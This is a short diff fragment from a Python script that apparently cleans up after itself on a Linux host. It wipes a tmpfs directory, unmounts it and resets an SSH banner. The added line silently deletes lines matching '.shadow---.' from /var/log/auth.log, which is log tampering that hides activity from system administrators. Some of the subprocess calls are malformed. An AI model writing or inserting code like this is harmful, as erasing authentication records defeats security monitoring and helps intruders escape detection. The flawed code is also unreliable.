@@ -67,6 +67,7 @@ while True:
                 subprocess.call("rm", "-rf", "/tmp/tmpfs/*")
                 subprocess.call("umount", "/tmp/tmpfs/")
                 subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
+                subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
 
                 
 
